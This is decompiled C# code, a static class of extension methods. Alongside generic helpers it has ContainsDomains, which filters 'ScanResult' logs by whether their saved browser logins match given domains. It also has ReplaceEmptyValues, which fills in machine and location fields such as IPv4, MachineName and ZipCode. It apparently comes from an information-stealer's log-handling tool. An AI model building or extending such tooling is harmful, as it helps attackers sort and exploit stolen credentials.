using System;
using System.Collections.Generic;
using System.Linq;

// Token: 0x02000038 RID: 56
public static class Extensions
{
	// Token: 0x06000123 RID: 291 RVA: 0x00003B9A File Offset: 0x00001D9A
	public static IEnumerable<T> DistinctBy<T, TKey>(this IEnumerable<T> items, Func<T, TKey> property)
	{
		return from x in items.GroupBy(property)
		select x.First<T>();
	}

	// Token: 0x06000124 RID: 292 RVA: 0x00003BC7 File Offset: 0x00001DC7
	public static T ChangeType<T>(this object @this)
	{
		return (T)((object)Convert.ChangeType(@this, typeof(T)));
	}

	// Token: 0x06000125 RID: 293 RVA: 0x00003BDE File Offset: 0x00001DDE
	public static string StripQuotes(this string value)
	{
		return value.Replace("\"", string.Empty);
	}

	// Token: 0x06000126 RID: 294 RVA: 0x0000A740 File Offset: 0x00008940
	public static bool ContainsDomains(this ScanResult log, string domains)
	{
		if (string.IsNullOrWhiteSpace(domains))
		{
			return true;
		}
		string[] array = domains.Split(new string[]
		{
			"|"
		}, StringSplitOptions.RemoveEmptyEntries);
		if (array != null && array.Length == 0)
		{
			return true;
		}
		ScanDetails scanDetails = log.ScanDetails;
		IEnumerable<Account> enumerable;
		if (scanDetails == null)
		{
			enumerable = null;
		}
		else
		{
			List<Browser> browsers = scanDetails.Browsers;
			if (browsers == null)
			{
				enumerable = null;
			}
			else
			{
				IEnumerable<Browser> enumerable2 = from x in browsers
				where x.Logins != null
				select x;
				if (enumerable2 == null)
				{
					enumerable = null;
				}
				else
				{
					enumerable = enumerable2.SelectMany((Browser x) => x.Logins);
				}
			}
		}
		IEnumerable<Account> enumerable3 = enumerable;
		if (enumerable3 == null)
		{
			return false;
		}
		if (enumerable3.Count<Account>() == 0)
		{
			return false;
		}
		foreach (Account account in enumerable3)
		{
			foreach (string value in array)
			{
				if (account.URL.Contains(value))
				{
					return true;
				}
			}
		}
		return false;
	}

	// Token: 0x06000127 RID: 295 RVA: 0x0000A858 File Offset: 0x00008A58
	public static void ReplaceEmptyValues(this ScanResult log)
	{
		log.City = (log.City ?? "UNKNOWN");
		log.Country = (log.Country ?? "UNKNOWN");
		log.FileLocation = (log.FileLocation ?? "UNKNOWN");
		log.Hardware = (log.Hardware ?? "UNKNOWN");
		log.IPv4 = (log.IPv4 ?? "UNKNOWN");
		log.Language = (log.Language ?? "UNKNOWN");
		log.MachineName = (log.MachineName ?? "UNKNOWN");
		log.OSVersion = (log.OSVersion ?? "UNKNOWN");
		log.Resolution = (log.Resolution ?? "UNKNOWN");
		log.TZ = (log.TZ ?? "UNKNOWN");
		log.ZipCode = (log.ZipCode ?? "UNKNOWN");
		log.ScanDetails = (log.ScanDetails ?? new ScanDetails());
	}
}
